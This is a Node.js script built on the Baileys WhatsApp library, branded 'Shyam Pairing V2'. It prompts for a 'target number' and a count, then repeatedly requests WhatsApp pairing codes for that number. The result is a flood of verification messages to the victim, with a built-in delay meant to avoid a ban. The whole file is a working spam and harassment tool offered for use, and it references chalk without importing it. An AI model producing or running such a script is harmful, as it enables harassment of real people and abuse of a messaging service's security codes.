const { default: makeWASocket, useMultiFileAuthState, delay } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

// Colors for Terminal
const color = ['\x1b[31m', '\x1b[32m', '\x1b[33m', '\x1b[34m', '\x1b[35m', '\x1b[36m'];
const xeonColor = color[Math.floor(Math.random() * color.length)];
const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

async function ShyamPairing() {
    // Session path
    const { state, saveCreds } = await useMultiFileAuthState('./shyam/session');
    
    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    console.log(xeonColor + `
╔═╗╦ ╦╦ ╦╔═╗╔╦╗  ╔═╗╔═╗╦╦═╗╦╔╗╔╔═╗
╚═╗╠═╣╚╦╝╠═╣║║║  ╠═╝╠═╣║╠╦╝║║║║║ ╦
╚═╝╩ ╩ ╩ ╩ ╩╩ ╩  ╩  ╩ ╩╩╩╚═╩╝╚╝╚═╝ V2
    ` + xColor);

    try {
        const phoneNumber = await question(xeonColor + 'Enter target number (ex: 917384287404): ' + xColor);
        const amount = parseInt(await question(xeonColor + 'How many codes to send? : '+ xColor));

        if (isNaN(amount) || amount <= 0) {
            console.log(chalk.red('Invalid Amount!'));
            return;
        }

        console.log(chalk.cyan(`\n🚀 Starting Pairing Spammer on ${phoneNumber}...\n`));

        for (let i = 0; i < amount; i++) {
            try {
                // Requesting pairing code from WhatsApp
                let code = await sock.requestPairingCode(phoneNumber.replace(/[^0-9]/g, ''));
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                
                console.log(chalk.green(`[${i + 1}] Code Sent: `) + chalk.white.bold(code));
                
                // Small delay to prevent instant ban
                await delay(2000); 
            } catch (err) {
                console.log(chalk.red(`Error at attempt ${i+1}: `) + err.message);
            }
        }
        console.log(chalk.yellow("\n✅ Task Completed!"));
        process.exit(0);

    } catch (error) {
        console.error('Fatal Error:', error);
    }
}

ShyamPairing();
